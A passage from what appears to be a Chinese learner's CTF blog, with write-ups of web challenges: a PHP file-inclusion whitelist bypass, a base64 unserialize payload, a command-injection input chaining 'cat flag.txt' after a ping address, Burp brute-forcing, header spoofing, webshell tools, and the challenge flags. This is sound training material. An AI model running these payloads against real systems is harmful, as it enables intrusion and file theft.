//对于include $_REQUEST[&#x27;file&#x27;]; </span><br><span class="line">    //就当做是以source.php为当前目录，往上返回四级目录后找到ffffllllaaaagggg吧</span><br><span class="line">    //然后在当前网页中插入ffffllllaaaagggg中的数据，打印出flag</span><br><span class="line">        include $_REQUEST[&#x27;file&#x27;];           </span><br><span class="line">        exit;</span><br><span class="line">    &#125; else &#123;                                 //--否则打印滑稽</span><br><span class="line">        echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>2、checkFile() 函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">public static function checkFile(&amp;$page)</span><br><span class="line">        //&amp;:https://www.cnblogs.com/qq1069284034/p/8390739.html</span><br><span class="line">        //$page由$_REQUEST[&#x27;file&#x27;]传入,值为source.php?/../../../../ffffllllaaaagggg</span><br><span class="line">        </span><br><span class="line">        &#123;</span><br><span class="line">            //列出白名单</span><br><span class="line">            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">            //isset()检测变量是否已设置并且非 NULL，存在且不为 NULL则返回true</span><br><span class="line">            //is_string()检查变量的类型是否为字符串，是字符串则返回true    </span><br><span class="line">            // ！ || ！逻辑，二者皆为true则不执行if内的语句，否则checkFile()返回false</span><br><span class="line">            if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">                echo &quot;you can&#x27;t see it&quot;;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            //判断$page是否存在于白名单</span><br><span class="line">            //此时$page==&quot;source.php?/../../../../ffffllllaaaagggg&quot;</span><br><span class="line">            //此时不存在于白名单，该if内语句不执行</span><br><span class="line">            if (in_array($page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">//mb_substr():https://www.runoob.com/php/func-string-mb_substr.html</span><br><span class="line">//“.”:https://blog.csdn.net/huawuque004/article/details/83301841</span><br><span class="line">//mb_strpos():https://www.feiniaomy.com/post/388.html</span><br><span class="line">//截取$page中&#x27;?&#x27;前部分赋给$_page</span><br><span class="line">//故$_page==&quot;source.php&quot;</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;)</span><br><span class="line">            );</span><br><span class="line">            </span><br><span class="line">            //此时$_page存在于白名单中，执行return true，我们回到审计代码中</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">//urldecode():https://www.w3cschool.cn/php/php-urldecode.html</span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;)</span><br><span class="line">            );</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            echo &quot;you can&#x27;t see it&quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><br/><p>题解链接（个人感觉有帮助的题解）：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;链接：[<a href="https://blog.csdn.net/weixin_44033675/article/details/121368078">HCTF 2018]WarmUp_1ance’s blog-CSDN博客</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;链接：[<a href="https://www.cnblogs.com/xhds/p/12266072.html">原题复现]HCTF 2018 Warmup（文件包含） - 笑花大王 - 博客园 (cnblogs.com)</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;链接：[<a href="https://www.cnblogs.com/R-S-PY/p/12095264.html">HCTF 2018]WarmUp - AlexANSO - 博客园 (cnblogs.com)</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;链接：<a href="https://blog.csdn.net/yybzzz/article/details/104971608">https://blog.csdn.net/yybzzz/article/details/104971608</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;链接：<a href="https://blog.csdn.net/qq_42016346/article/details/104199710">https://blog.csdn.net/qq_42016346/article/details/104199710</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;链接：<a href="https://blog.csdn.net/tch3430493902/article/details/103928125">https://blog.csdn.net/tch3430493902/article/details/103928125</a></p><br/><p>相关知识：</p><p>链接：<a href="https://blog.csdn.net/doubleguy/article/details/90166275">PHP $_REQUEST_doubleguy的博客-CSDN博客_php request</a></p><p>链接：<a href="https://blog.csdn.net/gc_msc/article/details/76050232">https://blog.csdn.net/gc_msc/article/details/76050232</a></p><br/><p>收录词条：代码审计、URL编码绕过</p><br/><p>&nbsp;&nbsp;&nbsp;&amp;nPHPstorm ，XAMPP</p><p><br/><br/></p><h4 id="Web-php-unserialize"><a href="#Web-php-unserialize" class="headerlink" title="Web_php_unserialize"></a>Web_php_unserialize</h4><p>代码段：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">//GET传参，输入点（URL/?var = 传入参数）</span><br><span class="line">if (isset($_GET[&#x27;var&#x27;])) &#123; </span><br><span class="line"></span><br><span class="line">    //base64解码$var</span><br><span class="line">    $var = base64_decode($_GET[&#x27;var&#x27;]); </span><br><span class="line">    </span><br><span class="line">    //正则过滤$var</span><br><span class="line">    //正则表达式:https://www.runoob.com/regexp/regexp-example.html</span><br><span class="line">    //preg_match():https://www.runoob.com/php/php-preg_match.html</span><br><span class="line">    if (preg_match(&#x27;/[oc]:\d+:/i&#x27;, $var)) &#123; </span><br><span class="line">        //终止</span><br><span class="line">        die(&#x27;stop hacking!&#x27;); </span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        //反序列化$var，这是我们要进入的地方</span><br><span class="line">        @unserialize($var); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; else &#123; </span><br><span class="line">    //展示URL/index.php</span><br><span class="line">    highlight_file(&quot;index.php&quot;); </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>Demo类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">class Demo &#123; </span><br><span class="line">    private $file = &#x27;index.php&#x27;;</span><br><span class="line">    public function __construct($file) &#123; </span><br><span class="line">        $this-&gt;file = $file; </span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct() &#123; </span><br><span class="line">        echo @highlight_file($this-&gt;file, true); </span><br><span class="line">    &#125;</span><br><span class="line">    function __wakeup() &#123; </span><br><span class="line">        if ($this-&gt;file != &#x27;index.php&#x27;) &#123; </span><br><span class="line">            //the secret is in the fl4g.php     --flag位置提示点</span><br><span class="line">            $this-&gt;file = &#x27;index.php&#x27;; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_wakeup() 该方法是PHP__反序列化时执行的__第一个方法 ， unserialize()会先检查是否存在 _wakeup()方法 ， 若存在则会先调用该方法 ， 来预先准备对象需要的资源( 比如重新建立数据库连接 ， 执行其他初始化操作等等 )<br>_construct() 与其它 OOP( 面向对象 ) 语言类似 ， PHP中也存在构造方法 ，具有构造方法的类会在每次创建新对象前调用此方法 ，该方法常用于完成一些初始化工作</p><p>_destruct() 析构方法 ， 当某个对象的所有引用都被删除或者当对象被显式销毁时 ， 析构函数会被执行 .</p><br/><p><strong>解题思路：</strong></p><p>&nbsp;&nbsp;&nbsp;&nbsp;详见题解链接</p><br/><p>payload构造过程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">据审计，应实现：new Demo(&quot;fl4g.php&quot;);    //实例化一个Demo对象</span><br><span class="line">其中经过一次base64解码，一次unserialize反序列化</span><br><span class="line">同时需绕过preg_match()函数与__wakeup()魔术方法</span><br><span class="line"></span><br><span class="line">则：按顺序依次处理 new Demo(&quot;fl4g.php&quot;);</span><br><span class="line"></span><br><span class="line">工具链接：https://c.runoob.com/compile/1/</span><br><span class="line">payload：TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</span><br><span class="line">flag：ctf&#123;b17bd4c7-34c9-4526-8fa8-a0794a197013&#125;</span><br></pre></td></tr></table></figure><p><img src="image-20220208033512717.png" alt="image-20220208033512717"></p><br/><p>题解链接：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;链接（荐）：<a href="https://blog.csdn.net/weixin_45254208/article/details/107316798">https://blog.csdn.net/weixin_45254208/article/details/107316798</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;链接：<a href="https://blog.csdn.net/qq_41617034/article/details/104573548">https://blog.csdn.net/qq_41617034/article/details/104573548</a></p><br/><p>知识积累：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;简单来说<br>&nbsp;&nbsp;&nbsp;&nbsp;序列化是把对象的状态信息转化为可存储或传输的形式过程，也就是把对象转化为字节序列 的过程称为对象的序列化 <a href="https://so.csdn.net/so/search?q=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020">反序列化</a>是序列化的逆向过程，把字节数组反序列化为对象，把字节序列恢复为对象的过程 成为对象的反序列化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">基本函数:</span><br><span class="line">    serialize()：用于序列化对象或数组，并返回一个字符串返回带有变量类型和值的字符串</span><br><span class="line"></span><br><span class="line">    unserialize()：将通过serialize()函数序列化后的对象或数组进行反序列化，并返回</span><br><span class="line">       原始的对象结构</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">魔术方法--不需要调用就可以执行的方法：</span><br><span class="line">__construct()，类的构造函数</span><br><span class="line"></span><br><span class="line">__destruct()，类的析构函数</span><br><span class="line"></span><br><span class="line">__call()，在对象中调用一个不可访问方法时调用</span><br><span class="line"></span><br><span class="line">__callStatic()，用静态方式中调用一个不可访问方法时调用</span><br><span class="line"></span><br><span class="line">__get()，获得一个类的成员变量时调用</span><br><span class="line"></span><br><span class="line">__set()，设置一个类的成员变量时调用</span><br><span class="line"></span><br><span class="line">__isset()，当对不可访问属性调用isset()或empty()时调用</span><br><span class="line"></span><br><span class="line">__unset()，当对不可访问属性调用unset()时被调用。</span><br><span class="line"></span><br><span class="line">__sleep()，执行serialize()时，先会调用这个函数</span><br><span class="line"></span><br><span class="line">__wakeup()，执行unserialize()时，先会调用这个函数</span><br><span class="line"></span><br><span class="line">__toString()，类被当成字符串时的回应方法</span><br><span class="line"></span><br><span class="line">__invoke()，调用函数的方式调用一个对象时的回应方法</span><br><span class="line"></span><br><span class="line">__set_state()，调用var_export()导出类时，此静态方法会被调用。</span><br><span class="line"></span><br><span class="line">__clone()，当对象复制完成时调用</span><br><span class="line"></span><br><span class="line">__autoload()，尝试加载未定义的类</span><br><span class="line"></span><br><span class="line">__debugInfo()，打印所需调试信息</span><br></pre></td></tr></table></figure><br/><br/><h4 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a>php_rce</h4><p><a href="https://blog.csdn.net/qq_45521281/article/details/105907276">CTF——Thinkphp5远程命令执行漏洞利用_WHOAMIAnony的博客-CSDN博客_thinkphp漏洞利用</a></p><p><a href="https://blog.csdn.net/qq_40884727/article/details/101452478">https://blog.csdn.net/qq_40884727/article/details/101452478</a></p><br/><br/><h4 id="Web-php-include"><a href="#Web-php-include" class="headerlink" title="Web_php_include"></a>Web_php_include</h4><br/><br/><h4 id="supersqli"><a href="#supersqli" class="headerlink" title="supersqli"></a>supersqli</h4><p><img src="image-20220213204954954.png" alt="image-20220213204954954"></p><p><img src="image-20220213205011317.png" alt="image-20220213205011317"></p><br/><br/><h1 id="sql-libs-SQL注入"><a href="#sql-libs-SQL注入" class="headerlink" title="sql libs(SQL注入)"></a>sql libs(SQL注入)</h1><p>链接：<a href="https://www.cnblogs.com/swl0221/p/12275508.html">https://www.cnblogs.com/swl0221/p/12275508.html</a></p><p>链接：<a href="https://blog.csdn.net/weixin_45728976/article/details/103932264">(2条消息) SQL注入篇——sqli-labs最详细1-40闯关指南_爱国小白帽-CSDN博客_sql注入闯关</a></p><p>链接：<a href="https://blog.csdn.net/sdb5858874/article/details/80727555">https://blog.csdn.net/sdb5858874/article/details/80727555</a></p><br/><p>既然学了MySQL，那SQL自然也逃不掉：<a href="https://www.w3school.com.cn/sql/index.asp">SQL 教程 (w3school.com.cn)</a></p><br/><br/><h1 id="bugku-基础web题"><a href="#bugku-基础web题" class="headerlink" title="bugku(基础web题)"></a>bugku(基础web题)</h1><p>链接：<a href="https://ctf.bugku.com/index.html">首页 - Bugku CTF</a></p><br/><br/><p>web学不动了，拿着别人的题解，连用的什么工具都不知道，暂时不刷了，之后要学的话我准备从基础一点的bugku开始，攻防世界还是不太适合小白。转pwn了，至少有人可以教我，而且基础工具及基础操作方法我也掌握了大概。web就当是踩了一个坑就放弃了吧，没人带学得挺慢的。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-Web</title>
      <link href="/2022/01/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Web/"/>
      <url>/2022/01/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Web/</url>
      
        <content type="html"><![CDATA[<br/><h2 id="view-source"><a href="#view-source" class="headerlink" title="view_source"></a>view_source</h2><p>右键点击查看网页源代码不可用</p><p>F12、ctrl+u、地址栏前面加上view-source查看网页源代码</p><p>view-source:URL</p><p><br/><br/></p><h2 id="robots"><a href="#robots" class="headerlink" title="robots"></a>robots</h2><p>网页爬虫robots协议，地址栏后加  /robots.txt  即可查看爬虫可检测的资源数据</p><p>URL/robots.txt</p><p><br/><br/></p><h2 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h2><p>常见的六种备忘文件格式 .git .svn .swp .~ .bak .bash_history</p><p>URL/index.php.bak</p><p><br/><br/></p><h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><p>之前想用Brup Suite抓包，但是捣鼓了半天没弄好，只能换Wireshark来抓包</p><p>Brup Suite下载：（自己去找）</p><p>（Brup Suite帮助文档：<a href="https://t0data.gitbooks.io/burpsuite%EF%BC%89">https://t0data.gitbooks.io/burpsuite）</a></p><p>Wireshark下载&amp;安装：<a href="https://blog.csdn.net/Qi2456/article/details/95033886">https://blog.csdn.net/Qi2456/article/details/95033886</a></p><p>Wireshark使用速成：<a href="https://b23.tv/nFBRoYS">https://b23.tv/nFBRoYS</a></p><br/><p>有了以上基础，这里就直接给图了：</p><p>看IP地址选择数据包，查看到以下字段</p><p><img src="image-20220118165024826.png" alt="image-20220118165024826"></p><p>url后添加  /cookie.php  获取指定资源:</p><p><img src="image-20220118165258439.png" alt="image-20220118165258439"></p><p>返回这一界面（See the http response：查看服务器响应报文）：</p><p><img src="image-20220118165356266.png" alt="image-20220118165356266"></p><p>查看Wireshark，发现捕捉到有关/cookie.php的数据包</p><p><img src="image-20220118165603028.png" alt="image-20220118165603028"></p><p>右键点击，查看TCP流：</p><p><img src="image-20220118165724094.png" alt="image-20220118165724094"></p><p>拿到flag：</p><p><img src="image-20220118165800464.png" alt="image-20220118165800464"></p><br/><p>另外，由浏览器的自带开发工具也可以解这道题：</p><p>首先，F12打开控制台，按以下图片操作：</p><p><img src="image-20220118170132006.png" alt="image-20220118170132006"></p><p><img src="image-20220118170341396.png" alt="image-20220118170341396"></p><p>它叫我们看cookie.php，那我们就看呗，地址栏写入相应资源：</p><p><img src="image-20220118170455065.png" alt="image-20220118170455065"></p><p><img src="image-20220118170532433.png" alt="image-20220118170532433"></p><p>进入查看，找到flag：</p><p><img src="image-20220118170747113.png" alt="image-20220118170747113"></p><br/><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag:cyberpeace&#123;17adcb29931a37eedfd9b45d4573af98&#125;</span><br></pre></td></tr></table></figure><p><br/><br/></p><h2 id="disabled-button"><a href="#disabled-button" class="headerlink" title="disabled_button"></a>disabled_button</h2><p>F12,删除disabled再按按钮即可</p><p><img src="image-20220118193027278.png" alt="image-20220118193027278"></p><p><br/><br/></p><h2 id="weak-auth"><a href="#weak-auth" class="headerlink" title="weak_auth"></a>weak_auth</h2><p>随机输入账户、密码登录，发现提示以用户名admin登录（密码未提示）：</p><p><img src="image-20220118212332148.png" alt="image-20220118212332148"></p><br/><p>接下来利用Brup Suite，创建网页：</p><p><img src="image-20220121062058553.png" alt="image-20220121062058553"></p><p>地址栏输入题目给的IP地址（显示加载中，进Brup点forward即可显示）：</p><p><img src="image-20220121062630832.png" alt="image-20220121062630832"></p><p><img src="image-20220121062732420.png" alt="image-20220121062732420"></p><br/><p>输入用户admin（），密码123，回车：</p><p><img src="image-20220118211507617.png" alt="image-20220118211507617"></p><p>返回Brup Suite抓包，抓到如下包：</p><p><img src="image-20220118211439592.png" alt="image-20220118211439592"></p><p>点击Forward抓包，前往HTTP history查看，找到刚刚对应的包：</p><p><img src="image-20220118211840368.png" alt="image-20220118211840368"></p><p>右键Send to Intruder（实施密码爆破），前往Intruder查看：</p><p><img src="image-20220118212014731.png" alt="image-20220118212014731"></p><p>将admin 两端的 $ 符号去掉，因为用户名admin已知是正确的，不需要爆破：</p><p><img src="image-20220118213828075.png" alt="image-20220118213828075"></p><p>点进Payloads，点击Load写好以下字典txt（密码：123456，提前知道的，这里就随便写几组，重要的是熟悉用法流程），并装载至Payload Options</p><p><img src="image-20220118210913233.png" alt="image-20220118210913233"></p><p><img src="image-20220118214025101.png" alt="image-20220118214025101"></p><p>最后点击右上侧的Start attack键即可开始爆破。</p><p>一个一个地看响应（Response），发现密码为123456时得到flag</p><p><img src="image-20220118210653461.png" alt="image-20220118210653461"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag:cyberpeace&#123;fcfc4fd91884d261c2bb7f0f115abce1&#125;</span><br></pre></td></tr></table></figure><p><br/><br/></p><h2 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h2><p>PHP基本语法：（自己去学）</p><p>Get传参：URL//?a=00a&amp;&amp;b=12345s</p><p><br/><br/></p><h2 id="get-post"><a href="#get-post" class="headerlink" title="get_post"></a>get_post</h2><p>get简单的说就是直接在url后面添加参数<br>post需要在http包里面添加参数或者在Firefox的hackbar里面可以直接添加参数</p><p>GET：URL/?a=1</p><p>POST：hackbar</p><p>———↑ 废话 ——–</p><br/><p>（本来打算自己用Brup Suite通过拦截/构造请求报文做这道题的，最后还是用了hackbar插件）搜了诸多资料后，了解到GET请求方式将请求数据放在了HTTP协议头＜request-line＞中，POST请求把提交的数据放置在HTTP包的包体＜request-body＞中，然后我就去构造请求报文，尝试了半天都没弄出来，一气之下便打开火狐下载hackbar插件，借助Wireshark抓包将三组请求数据报文抓出来一一对比，看完之后本人就无语了……。</p><p>贴个链接：<a href="https://www.cnblogs.com/biyeymyhjob/archive/2012/07/28/2612910.html">HTTP请求报文和HTTP响应报文 - as_ - 博客园 (cnblogs.com)</a></p><p>再贴一个：<a href="https://www.csdn.net/tags/NtTacg2sODkwNDEtYmxvZwO0O0OO0O0O.html"> 以post方式随便提交一个名为b的变量 - CSDN</a></p><p>链接：<a href="https://blog.csdn.net/liuno0/article/details/100542194"> Burpsuite拦截并修改request/response_liuno0的博客-CSDN博客_burp如何修改response</a></p><p>hackbar下载：<a href="https://blog.csdn.net/Drifter_Galaxy/article/details/118692054">hackbar2.1.3 安装教程（附下载地址 ）Firefox &amp; Chrome_coderge的博客-CSDN博客_hackbar</a></p><br/><p>解题过程：</p><p>火狐安装hackbar插件，F12：</p><p><img src="image-20220119160004865.png" alt="image-20220119160004865"></p><p>解题完毕。</p><br/><p>拓展：</p><p>以上操作过程全程Wireshark监控（无参发送一次、GET请求一次、GET加POST请求一次），抓到以下三个包，无参请求、Get请求、POST请求：</p><p><img src="image-20220119160141262.png" alt="image-20220119160141262"></p><p>对比无参请求、Get参数请求、Post参数请求：</p><p><img src="image-20220119160215794.png" alt="image-20220119160215794"></p><p>将第三张图片的POST请求报文粘贴至Brup Suite查看效果：</p><p><img src="image-20220119160313717.png" alt="image-20220119160313717"></p><p>响应报文中出现flag。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag:cyberpeace&#123;b30d28348d309b6e811d82eb7baa91d3&#125;</span><br></pre></td></tr></table></figure><p><br/><br/></p><h2 id="xff-referer"><a href="#xff-referer" class="headerlink" title="xff_referer"></a>xff_referer</h2><p>链接：<a href="https://blog.csdn.net/qq_41617034/article/details/91802623">https://blog.csdn.net/qq_41617034/article/details/91802623</a></p><br/><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:123.123.123.123</span><br><span class="line">Referer:https://www.google.com</span><br></pre></td></tr></table></figure><p>注：请求报文中插入XFF后，最后一行数据需空两行才能成功</p><br/><br/><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p>菜刀：<a href="https://blog.csdn.net/silence1_/article/details/89672553">https://blog.csdn.net/silence1_/article/details/89672553</a></p><p>蚁剑：<a href="https://blog.csdn.net/weixin_43545225/article/details/120255025">https://blog.csdn.net/weixin_43545225/article/details/120255025</a></p><p>蚁剑下载：<a href="https://blog.csdn.net/weixin_42474304/article/details/116376746">中国蚁剑(antSword)下载、安装、使用教程_CTF的博客-CSDN博客_中国蚁剑</a></p><p><img src="image-20220121040951156.png" alt="image-20220121040951156"></p><p><img src="image-20220121040917664.png" alt="image-20220121040917664"></p><p><img src="image-20220121041514296.png" alt="image-20220121041514296"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag:cyberpeace&#123;8f03eb815046d74a3bfedc206628512c&#125;</span><br></pre></td></tr></table></figure><br/><br/><h2 id="command-execution"><a href="#command-execution" class="headerlink" title="command_execution"></a>command_execution</h2><p>链接（OS命令注入攻击）：<a href="https://blog.csdn.net/qq_38265137/article/details/101158082">https://blog.csdn.net/qq_38265137/article/details/101158082</a></p><p>链接（《图解HTTP》224页）：<a href="https://blog.csdn.net/AC_greener/article/details/80219609">https://blog.csdn.net/AC_greener/article/details/80219609</a></p><br/><p>输入框输入以下数据即可获取flag：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;&amp;cd ../../../../../../../../../ &amp;&amp;cd ./home &amp;&amp;cat flag.txt</span><br></pre></td></tr></table></figure><p><img src="image-20220121042741986.png" alt="image-20220121042741986"></p><br/><h5 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;&amp;cd ../../../../../../../../../ &amp;&amp;ls</span><br></pre></td></tr></table></figure><p>目的：连续使用多次返回上一级目录，查看根目录所包含的资源（文件、文件夹等统称）情况：</p><p><img src="image-20220121044804580.png" alt="image-20220121044804580"></p><p>查看到有home目录的存在，而Linux操作系统中（绝大部分的服务器搭载的都是Linux操作系统）用户使用的目录就默认建立在home目录下，所以我们写出以下指令查看home目录下的资源情况：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;&amp;cd ../../../../../../../../../ &amp;&amp;cd ./home  &amp;&amp;ls</span><br></pre></td></tr></table></figure><p>ok，flag文档直接就出来了：</p><p><img src="image-20220121045219051.png" alt="image-20220121045219051"></p><p>最后就是开头那样，加一个“cat flag.txt”即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;&amp;cd ../../../../../../../../../ &amp;&amp;cd ./home &amp;&amp;cat flag.txt</span><br></pre></td></tr></table></figure><br/><p>推荐题解：</p><p>链接（手动测试）：<a href="https://blog.csdn.net/zouchengzhi1021/article/details/104074871">https://blog.csdn.net/zouchengzhi1021/article/details/104074871</a></p><p>链接（python脚本）：<a href="https://blog.csdn.net/qq_29566629/article/details/107633755">https://blog.csdn.net/qq_29566629/article/details/107633755</a></p><br/><br/><h2 id="simple-js"><a href="#simple-js" class="headerlink" title="simple_js"></a>simple_js</h2><p>链接（冗）：<a href="https://blog.csdn.net/qq_41617034/article/details/91490695">https://blog.csdn.net/qq_41617034/article/details/91490695</a></p><p>链接（修改源码）：<a href="https://blog.csdn.net/qq_40481505/article/details/89929978">https://blog.csdn.net/qq_40481505/article/details/89929978</a></p><p>链接（简）：<a href="https://blog.csdn.net/qq_37872337/article/details/108100275">https://blog.csdn.net/qq_37872337/article/details/108100275</a></p><p>链接（简+明）：<a href="https://www.cnblogs.com/ainv-123/p/11595170.html">攻防世界 simple——js - ainv - 博客园 (cnblogs.com)</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag:Cyberpeace&#123;786OsErtk12&#125;</span><br></pre></td></tr></table></figure><br/><br/><p>simple_js暂且过了</p><p><img src="image-20220121060020220.png" alt="image-20220121060020220"></p><p>最近先浅学一下PHP、Css、JavaScript吧，掌握基本语法，做到能看懂代码</p><p><img src="image-20220121061116038.png" alt="image-20220121061116038"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>xiaoxiao-Note1</title>
      <link href="/2021/11/12/xiaoxiao-Note1/"/>
      <url>/2021/11/12/xiaoxiao-Note1/</url>
      
